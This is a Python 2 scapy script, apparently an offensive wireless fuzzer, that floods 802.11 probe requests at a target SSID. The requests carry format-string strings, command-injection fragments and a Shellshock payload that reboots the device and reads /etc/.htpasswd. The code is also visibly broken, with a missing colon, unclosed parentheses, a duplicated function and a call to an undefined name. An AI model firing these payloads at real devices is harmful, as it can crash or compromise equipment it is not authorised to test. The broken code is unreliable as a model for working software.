#!/usr/bin/env python2

import threading
import string
from scapy.all import *

logfile = "wifiprobe.txt"
interface = "mon1"
		
def banner():
  print("WifiProbe-FUZZ -- v1.1 (Red Dragon Productions)")
  print("")
  print("This tool is designed to fuzz test wireless probes.")
  print("You should monitor the wireless device, if the device dissapears from view")
  print("then there is a possibility that the device is vulnerable to a buffer overflow attack.")
  print("")
  print("Please make sure your wireless card is set to monitor mode")
  print("Usage: ")
  print("python2 wifi_probe.py")

#Main Start
banner()
server = str(raw_input("SSID> "))
print("Negotiating with " + str(server) )

def engine():
  for i in range(1,256):

    fmts    = ['%s'*i, "AAA%08$x", "AAA%08%h", "AAA%08$s", "AAA%08$n", "%s"*i, "AAA%080$u"]
    rce     = ["reboot", "'set", ":set", "|set","$set"]
    io      = [str(1)*i] 
    bonull  = ["00"*i]
    bofull  = ["FF"*i]
    sshock  = ["env x='() { :;}; reboot' bash -c cat /etc/.htpasswd"]
    exploits = [fmts, rce, io, bonull, bofull, sshock]
    for x in exploits[:]:
      for i in x[:]
        def fuzzProbeDeltID():
          srpflood(RadioTap()/Dot11(type=0,subtype=4,addr2=server)/Dot11ProbeReq()/Dot11Elt(ID=str(i), info='00')

        def fuzzProbeDeltLEN(): 
          srpflood(RadioTap()/Dot11(type=0,subtype=4,addr2=server)/fuzz(Dot11ProbeReq())/Dot11Elt(ID='SSID', len=str(i), info='00')
                    
        def fuzzProbeDeltLEN(): 
          srpflood(RadioTap()/Dot11(type=0,subtype=4,addr2=server)/Dot11ProbeReq()/Dot11Elt(ID='SSID', len=str(i), info='00')
          
        def fuzzProbelongLEN():
          srpflood(RadioTap()/Dot11(type=0,subtype=4,addr2=server)/Dot11ProbeReq()/Dot11Elt(ID='SSID', len=64, info=str(i))
        
        def fuzzProbeSSID():
          srpflood(RadioTap()/Dot11(type=0,subtype=4,addr2=server)/Dot11ProbeReq()/Dot11Elt(ID='SSID', len=9, info=str(i))
          
        def fuzzProbeRATES():
          srpflood(RadioTap()/Dot11(type=0,subtype=4,addr2=server)/Dot11ProbeReq()/Dot11Elt(ID='RATES', info=str(i)) 
          
        def fuzzProbeEXTRATES():
          srpflood(RadioTap()/Dot11(type=0,subtype=4,addr2=server)/Dot11ProbeReq()/Dot11Elt(ID='EXT RATES ', info=str(i))  
          
        def fuzzProbeDSPARAM():
          srpflood(RadioTap()/Dot11(type=0,subtype=4,addr2=server)/Dot11ProbeReq()/Dot11Elt(ID='DS PARAM', info=str(i))
          
        def fuzzProbeCOUNTRY():
          srpflood(RadioTap()/Dot11(type=0,subtype=4,addr2=server)/Dot11ProbeReq()/Dot11Elt(ID='COUNTRY', info=str(i))
          
        def fuzzProbeREQUEST():
          srpflood(RadioTap()/Dot11(type=0,subtype=4,addr2=server)/Dot11ProbeReq()/Dot11Elt(ID='REQUEST', info=str(i))
          
        def fuzzProbeCHALLENGETEXT():
          srpflood(RadioTap()/Dot11(type=0,subtype=4,addr2=server)/Dot11ProbeReq()/Dot11Elt(ID='CHALLENGE TEXT ', info=str(i))
          
        def fuzzProbePOWERCONTRAINT():
          srpflood(RadioTap()/Dot11(type=0,subtype=4,addr2=server)/Dot11ProbeReq()/Dot11Elt(ID='POWER CONSTRAINT', info=str(i))
          
        def fuzzProbePOWERCAPAB():
          srpflood(RadioTap()/Dot11(type=0,subtype=4,addr2=server)/Dot11ProbeReq()/Dot11Elt(ID='POWER CAPAB ', info=str(i))
          
        def fuzzProbeCHANNELS():
          srpflood(RadioTap()/Dot11(type=0,subtype=4,addr2=server)/Dot11ProbeReq()/Dot11Elt(ID='CHANNELS', info=str(i))
          
        def fuzzProbeERPINFO():
          srpflood(RadioTap()/Dot11(type=0,subtype=4,addr2=server)/Dot11ProbeReq()/Dot11Elt(ID='ERP INFO', info=str(i))
          
        def fuzzProbeERPNONERPPRESENT():
          srpflood(RadioTap()/Dot11(type=0,subtype=4,addr2=server)/Dot11ProbeReq()/Dot11Elt(ID='ERP NONERP PRESENT', info=str(i))
          
        def fuzzProbeCHANNELSCHANNELBAND():
          srpflood(RadioTap()/Dot11(type=0,subtype=4,addr2=server)/Dot11ProbeReq()/Dot11Elt(ID='CHANNELS CHANNEL BAND',info=str(i))
          
        def fuzzProbeERPBARKERLONG():
          srpflood(RadioTap()/Dot11(type=0,subtype=4,addr2=server)/Dot11ProbeReq()/Dot11Elt(ID='ERP BARKER LONG', info=str(i))
          
        def fuzzProbeRSN():
          srpflood(RadioTap()/Dot11(type=0,subtype=4,addr2=server)/Dot11ProbeReq()/Dot11Elt(ID='RSN', info=str(i))
          
        def fuzzProbeVENDOR():
          srpflood(RadioTap()/Dot11(type=0,subtype=4,addr2=server)/Dot11ProbeReq()/Dot11Elt(ID='VENDOR', info=str(i))
          
        def fuzzProbeCOUNTRYTRIPLET():
          srpflood(RadioTap()/Dot11(type=0,subtype=4,addr2=server)/Dot11ProbeReq()/Dot11Elt(ID='COUNTRY TRIPLET', info=str(i))
          
        def fuzzProbeCOUNTRYBANDTRIPLET():
          srpflood(RadioTap()/Dot11(type=0,subtype=4,addr2=server)/Dot11ProbeReq()/Dot11Elt(ID='COUNTRY BAND TRIPLET', info=str(i))
          
        def fuzzProbeCOUNTRYEXT_TRIPLET():
          srpflood(RadioTap()/Dot11(type=0,subtype=4,addr2=server)/Dot11ProbeReq()/Dot11Elt(ID='COUNTRY EXT TRIPLET', info=str(i))

        tofuzz = [
            fuzzProbeDeltID(),
            fuzzfuzzProbeDeltLEN(),
            fuzzProbeDeltLEN(),
            fuzzProbeSSID(),
            fuzzProbeRATES(),
            fuzzProbeEXTRATES(),
            fuzzProbeDSPARAM(),
            fuzzProbeCOUNTRY(),
            fuzzProbeREQUEST(),
            fuzzProbeCHALLENGETEXT(),
            fuzzProbePOWERCONTRAINT(),
            fuzzProbePOWERCAPAB(),
            fuzzProbeCHANNELS(),
            fuzzProbeERPINFO(),
            fuzzProbeERPNONERPPRESENT(),
            fuzzProbeCHANNELSCHANNELBAND(),
            fuzzProbeERPBARKERLONG(),
            fuzzProbeRSN(),
            fuzzProbeVENDOR(),
            fuzzProbeCOUNTRYTRIPLET(),
            fuzzProbeCOUNTRYBANDTRIPLET(),
            fuzzProbeCOUNTRYEXT_TRIPLET()
          ]
          
        for a in tofuzz[:]:
          try:
            srpflood(RadioTap()/Dot11(type=0,subtype=4,addr2=server)/Dot11ProbeReq()/a)
          except:
			print("ERROR - Cant send probe")
			
def getresp(p):
  logfile = open("log.txt","a")
  dframe = (5,5)
  
  if p.haslayer(Dot11):
    if p.addr1 == server:
      if p.type == 0 and p.subtype in dframe:
        d = str(p)
        logfile.write(str(d)+"\n")
        print(d)


#Start the engine
t = threading.Thread(target = engine)
t.start()

#Sniff the data
while True:
  hexdump(sniff(prn=getresp).show)
